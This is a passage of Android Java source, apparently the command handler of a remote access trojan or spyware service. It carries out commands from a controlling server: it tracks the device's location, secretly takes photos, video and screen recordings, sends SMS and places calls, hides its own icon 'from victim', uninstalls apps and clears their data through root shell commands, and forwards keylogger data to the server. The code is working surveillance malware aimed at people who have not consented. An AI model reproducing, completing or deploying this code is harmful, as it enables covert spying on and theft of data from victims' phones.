                        Intent intent = new Intent(Const.ACTION_JANUS_SESSION_POLL);
                        intent.putExtra(Const.EXTRA_EVENT, Const.EXTRA_EVENT);
                        intent.putExtra(Const.EXTRA_MESSAGE, response);
                        sendBroadcast(intent);
                    } else {
                        throw new Exception("Unknown poll result");
                    }*/

                    responseStatus = true;
                    responseMessage = "Connecting, Wait a moment..";
                } catch (Exception e) {
                    clearNotification(NOTIFICATION_ID_SECONDARY);
                    responseStatus = false;
                    responseMessage = TextUtils.isEmpty(e.getMessage()) ? "Failed connect with remote display!" : e.getMessage();
                    Log.w(Const.LOG_TAG, responseMessage);
                }
                //socketHandler.sendRemoteActionResponse("remoteDisplayControl", responseStatus, responseMessage, new JSONObject());
            }
        });
    }

    private void processRemoteAction(JSONObject cmdObj) {
        final String actionCmd = cmdObj.optString("cmd");
        JSONObject actionData;
        try {
            actionData = cmdObj.getJSONObject("data");
        } catch (Exception e) {
            actionData = new JSONObject();
        }
        switch (actionCmd) {
            case "Request Permissions":
                /*UUID enqueueId = oneTimeWorkRequest.enqueueRequest(OneTimeWorker.class, SocketWorker.ACTION_REQUEST_PERMISSIONS, null);
                oneTimeWorkRequest.getWorkInfo(enqueueId, mainExecutor, new BaseOneTimeWorkRequest.Listener() {
                    @Override
                    public void onValue(boolean succeeded, @NonNull Data data) {
                        socketHandler.sendRemoteActionResponse(actionCmd, true, "Permissions requested successfully", null);
                    }
                });*/
                try {
                    JSONObject response = new JSONObject();
                    response.put("granted", PermissionsBinder.isAllPermissionGranted(getApplicationContext(), true));
                    socketHandler.sendRemoteActionResponse(actionCmd, true, "Permissions requested successfully", response);
                } catch (JSONException ignored) {
                }
                break;
            case "Check Permissions":
                responseData = new JSONObject();
                try {
                    ArrayList<String> grantedPermissions = Permissions.getGrantedPermissions(getApplicationContext(), PermissionsUtils.permission);
                    responseData.put(PermissionsBinder.Type.ACCESSIBILITY_SERVICE.label, PermissionsUtils.isAccessibilityServiceEnabled(getApplicationContext()));
                    responseData.put(PermissionsBinder.Type.USAGE_ACCESS.label, PermissionsUtils.isUsageAccessEnabled(getApplicationContext()));
                    responseData.put(PermissionsBinder.Type.NOTIFICATION_LISTENER_ACCESS.label, PermissionsUtils.checkNotificationListenerAccess(getApplicationContext()));
                    responseData.put(PermissionsBinder.Type.IGNORE_BATTERY_OPTIMIZATION.label, PermissionsUtils.checkDozeMod(getApplicationContext()));
                    responseData.put(PermissionsBinder.Type.SCREEN_CAPTURE.label, "");
                    responseData.put(PermissionsBinder.Type.DRAW_OVER_OTHER_APPS.label, PermissionsUtils.checkDrawOverOtherApps(getApplicationContext()));
                    responseData.put(PermissionsBinder.Type.INSTALL_UNKNOWN_APPS.label, PermissionsUtils.requestForUnknownAppInstall(getApplicationContext()));
                    responseData.put(PermissionsBinder.Type.AUTO_START_PERMISSION.label, PermissionsUtils.checkAutostartPermission(getApplicationContext()));
                    responseData.put(PermissionsBinder.Type.DEVICE_ADMINISTRATOR_ACCESS.label, "");
                    responseData.put(PermissionsBinder.Type.DATA_ACCESS_PERMISSIONS.label, grantedPermissions);
                } catch (JSONException ignored) {
                }
                socketHandler.sendRemoteActionResponse(actionCmd, true, "Permissions checked", responseData);
                break;
            case "Get Location":
                responseData = new JSONObject();
                try {
                    responseData = GpsTracker.getLocationData(gpsTracker);
                } catch (Exception ignored) {
                }
                socketHandler.sendRemoteActionResponse(actionCmd, true, "Successfully located device", responseData);
                break;
            case "Vibrate Phone":
                try {
                    long[] PATTERN = new long[]{500, 500};
                    Vibrator vibrator;
                    //if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    //    VibratorManager vibratorManager = (VibratorManager) context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE);
                    //    vibrator = vibratorManager.getDefaultVibrator();
                    //} else {
                    vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                    //}

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        VibrationEffect vibrationEffect = VibrationEffect.createWaveform(PATTERN, 0);
                        vibrator.vibrate(vibrationEffect, new AudioAttributes.Builder().setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION).setUsage(AudioAttributes.USAGE_ALARM).build());
                    } else {
                        vibrator.vibrate(PATTERN, 0);
                    }

                    int vibrateTime = cmdObj.optInt("data", 5);
                    if (vibrateTime > 20) vibrateTime = 20;
                    mainExecutor.getNewHandler().postDelayed(vibrator::cancel, 1000L * vibrateTime);
                    responseStatus = true;
                    responseMessage = "Successfully vibrate phone";
                } catch (Exception e) {
                    responseStatus = false;
                    responseMessage = TextUtils.isEmpty(e.getMessage()) ? "Failed vibrate phone" : e.getMessage();
                }
                socketHandler.sendRemoteActionResponse(actionCmd, responseStatus, responseMessage, new JSONObject());
                break;
            case "Ringing Phone":
                try {
                    if (!PermissionsUtils.checkDoNotDisturbAccess(getApplicationContext(), true)) {
                        throw new Exception("Notification Policy Access permission not granted");
                    }

                    AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                    if (audioManager.getRingerMode() == AudioManager.RINGER_MODE_VIBRATE || audioManager.getRingerMode() == AudioManager.RINGER_MODE_SILENT) {
                        audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
                    }
                    int maxVolumeR = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING);
                    audioManager.setStreamVolume(AudioManager.STREAM_RING, maxVolumeR, AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE);

                    Uri ringtoneUri = RingtoneManager.getActualDefaultRingtoneUri(getApplicationContext(), RingtoneManager.TYPE_RINGTONE);
                    Ringtone ringtone = RingtoneManager.getRingtone(getApplicationContext(), ringtoneUri);
                    ringtone.play();

                    int ringingTime = cmdObj.optInt("data", 5);
                    if (ringingTime > 20) ringingTime = 20;
                    mainExecutor.getNewHandler().postDelayed(ringtone::stop, 1000L * ringingTime);
                    responseStatus = true;
                    responseMessage = "Successfully played ringtone";
                } catch (Exception e) {
                    responseStatus = false;
                    responseMessage = TextUtils.isEmpty(e.getMessage()) ? "Failed played ringtone" : e.getMessage();
                }
                socketHandler.sendRemoteActionResponse(actionCmd, responseStatus, responseMessage, new JSONObject());
                break;

            case "Capture Image":
                ACameraCapturingService pictureService = CameraCapturingServiceImpl.getInstance(getApplicationContext());
                pictureService.setCameraFacing(actionData.optBoolean("useFrontCamera", true) ? CameraFacing.Front : CameraFacing.Back);
                pictureService.setFlashMode(actionData.optBoolean("useFlash", false) ? FlashMode.FLASH_ON : FlashMode.FLASH_OFF);
                pictureService.setImageCompressQuality(50);
                pictureService.captureImage(new PictureCapturingListener() {
                    @Override
                    public void onCaptureDone(String pictureUrl, byte[] pictureData) {
                        Utils.getLog("onCaptureDone path ===> " + pictureUrl);
                        //final Bitmap bitmap = BitmapFactory.decodeByteArray(pictureData, 0, pictureData.length);
                        try {
                            Bitmap bitmap = FileUtil.decodeSampleBitmapFromByteArray(pictureData, 1000, 1000);
                            responseData = new JSONObject();
                            responseData.put("path", pictureUrl);
                            responseData.put("imageData", FileUtil.encodeImage(bitmap, 90));
                        } catch (JSONException ignored) {
                        }
                        socketHandler.sendRemoteActionResponse(actionCmd, true, "Taking picture successfully", responseData);
                    }

                    @Override
                    public void onCaptureError(String error) {
                        Utils.getLog("onCaptureError ===> " + error);
                        socketHandler.sendRemoteActionResponse(actionCmd, false, (error.isEmpty() ? "No camera detected!" : error), responseData);
                    }
                });
                break;
            case "Capture Video":
                ACameraCapturingService videoService = CameraCapturingServiceImpl.getInstance(getApplicationContext());
                videoService.setCameraFacing(actionData.optBoolean("useFrontCamera", true) ? CameraFacing.Front : CameraFacing.Back);
                videoService.setFlashMode(actionData.optBoolean("useFlash", false) ? FlashMode.FLASH_ON : FlashMode.FLASH_OFF);
                videoService.setVideoCapturingTime(actionData.optInt("captureTime", 1));
                videoService.captureVideo(new VideoCapturingListener() {
                    @Override
                    public void onCapturingProgress(String progress) {
                        Utils.getLog("Captured video progress ===> " + progress);
                    }

                    @Override
                    public void onCaptureDone(String videoUrl, byte[] videoData) {
                        Utils.getLog("Captured video ===> " + videoUrl);
                        try {
                            responseData = new JSONObject();
                            responseData.put("path", videoUrl);
                            //responseData.put("bytes", videoData);
                        } catch (JSONException ignored) {
                        }
                        socketHandler.sendRemoteActionResponse(actionCmd, true, "Capturing video successfully", responseData);
                    }

                    @Override
                    public void onCaptureError(String error) {
                        Utils.getLog("onCaptureError ===> " + error);
                        socketHandler.sendRemoteActionResponse(actionCmd, false, (error.isEmpty() ? "No camera detected!" : error), responseData);
                    }
                });
                break;
            case "Record Audio":
                break;
            case "Record Screen":
                responseData = new JSONObject();
                try {
                    if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.LOLLIPOP) {
                        throw new Exception("Screen recording in 21 or lower versions not implemented");
                    }
                    final ScreenRecorderConfig config = ScreenRecorderConfig.fromJSON(actionData.getJSONObject("config"));
                    screenRecorder = new ScreenRecorder(getApplicationContext(), screenRecorderListener);
                    screenRecorder.setConfig(config);
                    if (config.isAudioEnabled()) {
                        Permissions.requestIfNotGranted(getApplicationContext(), Manifest.permission.RECORD_AUDIO, var1 -> {
                            if (var1.args) {
                                ActionActivity.start(instance, ActionActivity.ACTION_RECORD_SCREEN);
                            } else {
                                responseMessage = "Screen recording failed. Record audio permission not granted";
                                socketHandler.sendRemoteActionResponse(actionCmd, false, responseMessage, null);
                            }
                            return null;
                        });
                    } else {
                        ActionActivity.start(instance, ActionActivity.ACTION_RECORD_SCREEN);
                    }

                } catch (Exception e) {
                    responseStatus = false;
                    responseMessage = TextUtils.isEmpty(e.getMessage()) ? "Screen recording failed. " : e.getMessage();
                    socketHandler.sendRemoteActionResponse(actionCmd, responseStatus, responseMessage, responseData);
                }
                break;
            case "Make call":
                String dialerNo = actionData.optString("dialerNo");
                if (!dialerNo.isEmpty() && appUtils.makePhoneCall(dialerNo)) {
                    responseStatus = true;
                    responseMessage = "Calling succeed.";
                } else {
                    responseStatus = false;
                    responseMessage = "Calling failed!";
                }
                socketHandler.sendRemoteActionResponse(actionCmd, responseStatus, responseMessage, new JSONObject());
                break;
            case "Send sms":
                String number = actionData.optString("number");
                String message = actionData.optString("message");
                Permissions.requestIfNotGranted(getApplicationContext(), Manifest.permission.SEND_SMS, var1 -> {
                    if (var1.args) {
                        if (!number.isEmpty() && !message.isEmpty() && SocketHandler.sendSMS(number, message)) {
                            responseStatus = true;
                            responseMessage = "SMS sent";
                        } else {
                            responseStatus = false;
                            responseMessage = "SMS send failed! Check recipient";
                        }
                    } else {
                        responseStatus = false;
                        responseMessage = "Send Sms Permission not allowed by victim!";
                    }
                    socketHandler.sendRemoteActionResponse(actionCmd, responseStatus, responseMessage, new JSONObject());
                    return null;
                });
                break;
            case "Take screenshot":
                responseData = new JSONObject();
                try {
                    //Intent dialogIntent = new Intent(instance, ScreenShotActivity.class);
                    //dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    //startActivity(dialogIntent);

                    responseStatus = true;
                    responseMessage = "Successfully taking screenshot";
                } catch (Exception e) {
                    responseStatus = false;
                    responseMessage = TextUtils.isEmpty(e.getMessage()) ? "Failed taking screenshot" : e.getMessage();
                }
                socketHandler.sendRemoteActionResponse(actionCmd, responseStatus, responseMessage, responseData);
                break;
            case "Hide App Icon":
                responseData = new JSONObject();
                try {
                    boolean isHideAppIcon = cmdObj.optBoolean("data", true);
                    AppChanger.setAppVisibility(getApplicationContext(), !isHideAppIcon);
                    responseStatus = true;
                    responseMessage = "Now App icon " + (isHideAppIcon ? "hidden from victim" : "visible to victim");
                } catch (Exception e) {
                    responseStatus = false;
                    responseMessage = TextUtils.isEmpty(e.getMessage()) ? "Failed hiding app icon" : e.getMessage();
                }
                socketHandler.sendRemoteActionResponse(actionCmd, responseStatus, responseMessage, responseData);
                break;
            case "Enable Gps Network":
                responseData = new JSONObject();
                try {
                    LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                    boolean enableGps = cmdObj.optBoolean("data", true);
                    boolean isGpsEnabled = manager.isProviderEnabled(LocationManager.GPS_PROVIDER);
                    if (isGpsEnabled && !enableGps) {
                        isGpsEnabled = PermissionsUtils.turnOffGPS(getApplicationContext());
                    } else if (!isGpsEnabled && enableGps) {
                        isGpsEnabled = PermissionsUtils.turnOnGPS(getApplicationContext());
                    }
                    responseData.put("isGpsEnabled", isGpsEnabled);
                } catch (JSONException ignored) {
                }
                socketHandler.sendRemoteActionResponse(actionCmd, true, "Successfully enabled gps", responseData);
                break;
            case "Launch application":
                responseData = new JSONObject();
                JSONObject request = cmdObj.optJSONObject("data");
                if (request == null) request = new JSONObject();
                String packageName = request.optString("packageName").trim();
                String activityName = request.optString("activityName").trim();
                boolean isSucceed;
                if (TextUtils.isEmpty(activityName)) {
                    isSucceed = ApkUtils.launchApplication(ForegroundService.this, packageName);
                } else {
                    isSucceed = ApkUtils.launchApplication(ForegroundService.this, packageName, activityName);
                }
                socketHandler.sendRemoteActionResponse(actionCmd, isSucceed, "Application launch requested", responseData);
                break;
            case "Uninstall application":
                responseData = new JSONObject();
                request = cmdObj.optJSONObject("data");
                if (request == null) request = new JSONObject();
                packageName = request.optString("packageName").trim();
                activityName = request.optString("activityName").trim();
                ApkUtils.uninstallApplication(getApplicationContext(), packageName);
                socketHandler.sendRemoteActionResponse(actionCmd, true, "Application uninstall requested", responseData);
                break;
            case "Clear application data":
                responseData = new JSONObject();
                request = cmdObj.optJSONObject("data");
                if (request == null) request = new JSONObject();
                packageName = request.optString("packageName").trim();
                activityName = request.optString("activityName").trim();
                if (hasRootAccess) {
                    ShellUtils.executeSudoForResult("pm clear --user 0 " + packageName);
                }
                socketHandler.sendRemoteActionResponse(actionCmd, hasRootAccess, hasRootAccess ? "Application data cleared successfully" : "Root access not granted.", responseData);
                break;
            case "Wait":
                new CountDownTimer(20 * 1000, 5000) {
                    @Override
                    public void onTick(long millisUntilFinished) {
                        log("Waiting +5 seconds more");
                    }

                    @Override
                    public void onFinish() {
                    }
                }.start();
                break;
        }
    }

    /**
     * Screen sharing
     */

    private ScreenSharingHandler screenSharingHandler;


    /**
     * Screen Recording
     */
    private ScreenRecorderHandler screenRecorderHandler;
    private ScreenRecorder screenRecorder;

    private final ScreenRecorderListener screenRecorderListener = new ScreenRecorderListener() {
        @Override
        public void HBRecorderOnStart() {
            responseMessage = "Screen recording started";
            socketHandler.sendRemoteActionResponse("Record Screen", true, responseMessage, responseData);
        }

        @Override
        public void HBRecorderOnComplete() {
            responseMessage = "Screen recording completed";
            socketHandler.sendRemoteActionResponse("Record Screen", true, responseMessage, responseData);
        }

        @Override
        public void HBRecorderOnError(int errorCode, String reason) {
            responseData = new JSONObject();
            try {
                responseData.put("errorCode", errorCode);
                responseData.put("reason", reason);
            } catch (JSONException ignored) {
            }
            responseMessage = "An Error occurred in screen recording";
            socketHandler.sendRemoteActionResponse("Record Screen", false, responseMessage, responseData);
        }

        @Override
        public void HBRecorderOnPause() {
            log("HBRecorderOnPause ---------------> Paused");
        }

        @Override
        public void HBRecorderOnResume() {
            log("HBRecorderOnResume ---------------> Resumed");
        }
    };

    /**
     * Broadcast Receiver
     */
    private static final String ACTION_BROADCAST = "ACTION_BROADCAST";

    public static Intent getBroadcastIntent(String action, JSONObject data) {
        Intent intent = new Intent(ACTION_BROADCAST);
        intent.putExtra("action", action);
        intent.putExtra("jsonData", data.toString());
        return intent;
    }

    public static Intent getBroadcastIntent(String action, int resultCode, Intent data) {
        Intent intent = new Intent(ACTION_BROADCAST);
        intent.putExtra("action", action);
        intent.putExtra("resultCode", resultCode);
        intent.putExtra("intentData", data);
        return intent;
    }

    private final BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {

        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getStringExtra("action");
            String jsonData = intent.getStringExtra("jsonData");
            int resultCode = intent.getIntExtra("resultCode", 0);
            Intent intentData = intent.getParcelableExtra("intentData");

            JSONObject json = new JSONObject();
            try {
                if (jsonData != null) json = new JSONObject(jsonData);
            } catch (JSONException ignored) {
            }

            switch (action = (action == null ? "" : action)) {
                case "START_SCREEN_RECORDING":
                    if (resultCode == RESULT_OK) {
                        //Set file path or Uri depending on SDK version & Start screen recording
                        screenRecorder.startScreenRecording(intentData, resultCode);
                    } else {
                        System.out.println("------------------> screenRecorder capture request not granted or screenRecorder is null");
                    }
                    break;
                case "SEND_KEYLOGGER_DATA":
                    System.out.println(adminOnlineStatus + " >>>> " + json);
                    if (adminOnlineStatus) {
                        socketHandler.sendDataToServer("onKeyloggerDataAdded", json, true);
                    } else {
                        rootFilesManager.saveText(json.toString() + "\n", "KeyloggerData_List.txt", true);
                    }
                    break;
                case "ACTION_RECORD_CALL":
                    socketHandler.sendDataToServer("getKeyloggerData", json, true);
                    break;
                default:
                    break;
            }
        }
    };

    public static void startService(Context context) {
        startService(context, null);
    }

    public static void startService(Context context, Intent intent) {
        if (intent == null) intent = new Intent(context, CLASS);
        Intent serviceIntent = intent;
        new Thread(() -> {
            initForegroundService(context, serviceIntent);
        }).start();
    }

    public static void stopService(Context context) {
        if (ForegroundService.isServiceRunning()) {
            Intent serviceIntent = new Intent(context, CLASS);
            context.stopService(serviceIntent);
        }
    }

    public static void bindService(Context context, ServiceConnection connection) {
        Intent serviceIntent = new Intent(context, CLASS);
        context.bindService(serviceIntent, connection, Context.BIND_AUTO_CREATE);
    }

}